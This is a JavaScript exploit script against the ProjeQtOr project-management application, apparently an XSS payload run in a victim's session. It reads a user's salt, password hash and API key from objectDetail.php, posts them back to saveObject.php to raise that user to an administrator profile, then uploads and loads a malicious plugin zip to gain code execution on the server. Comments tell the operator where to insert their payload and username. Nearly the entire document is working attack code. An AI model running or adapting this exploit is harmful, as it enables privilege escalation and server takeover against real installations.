// Encodes base64 data
function base64toBlob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);
        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

// Steals password, Salt and apiKey which are required by saveObject.php
function escalatePrivileges(request3) {
    var data = request3.response;
    parser = new DOMParser();
    xmlDoc = parser.parseFromString(data, "text/html");
    var Salt = xmlDoc.getElementsByName("salt")[0].getAttribute('value');
    var password = xmlDoc.getElementsByName('password')[0].getAttribute('value');
    var apiKey = xmlDoc.getElementsByName('apiKey')[0].innerHTML;
    var xhr = new XMLHttpRequest();
    var url = '/projeqtor/tool/saveObject.php';
    xhr.open('POST', url);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('objectClassName=User&loginTry=0&isEmployee=0&idRole=&idCalendarDefinition=1&id=3&name=user1&resourceName=user&initials=&email=&idProfile=1&startDate=&description=&idTeam=&idOrganization=&salt=' + Salt + '&crypto=sha256&cookieHash=&passwordChangeDate=&password=' + password + '&apiKey=' + apiKey);  // Change the parameters name=user1&resourceName=user to match your username

}

//Uploads and installs the malicious plugin
function uploadPlugin(base64toBlob) {
    var b64file = ""; // Insert your base64 encoded zip file. Example: base64 evilPlugin.zip | tr -d "\n"
    var content_type = 'application/x-zip-compressed';
    var blob = base64toBlob(b64file, content_type);
    var sizeInBytes = blob.size;
    var formData = new FormData();
    formData.append('pluginFile', blob,'evilPlugin.zip');
    formData.append('type', 'application/x-zip-compressed');
    formData.append('uploadType', 'html5');
    formData.append('size', sizeInBytes);
    var url = '/projeqtor/tool/uploadPlugin.php';
    var request = new XMLHttpRequest();
    request.open('POST', url);
    request.send(formData);
    var unzipPluginUrl = "/projeqtor/plugin/loadPlugin.php?pluginFile=evilPlugin.zip";
    var request2 = new XMLHttpRequest();
    request2.open('GET', unzipPluginUrl, true);
    request2.send(null);
}
//Initial request 
var request3 = new XMLHttpRequest();
request3.open('POST', '/projeqtor/view/objectDetail.php', true);
request3.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
request3.onreadystatechange = function() {
    if (request3.readyState == XMLHttpRequest.DONE) {
            escalatePrivileges(request3);
            uploadPlugin(base64toBlob);            
    }
}
request3.send("objectClass=User&objectId=3&objectClassList=User&listIdFilter=&listNameFilter=&listFilterClause=");
